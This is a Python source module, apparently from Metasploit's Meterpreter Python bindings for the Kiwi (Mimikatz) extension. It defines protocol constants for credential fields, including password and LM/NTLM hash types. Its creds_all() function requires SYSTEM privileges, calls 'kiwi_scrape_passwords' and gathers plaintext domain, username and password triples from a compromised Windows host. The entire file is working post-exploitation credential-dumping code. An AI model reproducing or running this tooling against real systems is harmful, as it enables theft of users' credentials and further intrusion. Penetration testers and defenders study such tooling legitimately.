import meterpreter_bindings
import meterpreter.user

from meterpreter.core import *

TLV_KIWI_EXTENSION = 20000

TLV_TYPE_KIWI_PWD_ID           = TLV_META_TYPE_UINT    | (TLV_KIWI_EXTENSION + 1)
TLV_TYPE_KIWI_PWD_RESULT       = TLV_META_TYPE_GROUP   | (TLV_KIWI_EXTENSION + 2)
TLV_TYPE_KIWI_PWD_USERNAME     = TLV_META_TYPE_STRING  | (TLV_KIWI_EXTENSION + 3)
TLV_TYPE_KIWI_PWD_DOMAIN       = TLV_META_TYPE_STRING  | (TLV_KIWI_EXTENSION + 4)
TLV_TYPE_KIWI_PWD_PASSWORD     = TLV_META_TYPE_STRING  | (TLV_KIWI_EXTENSION + 5)
TLV_TYPE_KIWI_PWD_AUTH_HI      = TLV_META_TYPE_UINT    | (TLV_KIWI_EXTENSION + 6)
TLV_TYPE_KIWI_PWD_AUTH_LO      = TLV_META_TYPE_UINT    | (TLV_KIWI_EXTENSION + 7)
TLV_TYPE_KIWI_PWD_LMHASH       = TLV_META_TYPE_STRING  | (TLV_KIWI_EXTENSION + 8)
TLV_TYPE_KIWI_PWD_NTLMHASH     = TLV_META_TYPE_STRING  | (TLV_KIWI_EXTENSION + 9)

def creds_all():
  if not meterpreter.user.is_system():
    raise Exception('Unable to extract credentials: Not running as SYSTEM')

  tlv = tlv_pack(TLV_TYPE_KIWI_PWD_ID, 0)
  resp = invoke_meterpreter('kiwi_scrape_passwords', True, tlv)
  if resp == None:
    return False

  if packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] != 0:
    return False

  found = set([])
  creds = []
  for group in packet_enum_tlvs(resp, TLV_TYPE_KIWI_PWD_RESULT):
    domain = packet_get_tlv(group['value'], TLV_TYPE_KIWI_PWD_DOMAIN)
    username = packet_get_tlv(group['value'], TLV_TYPE_KIWI_PWD_USERNAME)
    password = packet_get_tlv(group['value'], TLV_TYPE_KIWI_PWD_PASSWORD)

    if domain and username and password:
      key = '{0}\x01{1}\x01{2}'.format(domain['value'], username['value'], password['value'])
      if not key in found:
        found.add(key)
        creds.append({
          'Domain': domain['value'],
          'Username': username['value'],
          'Password': password['value']
        })
  return creds
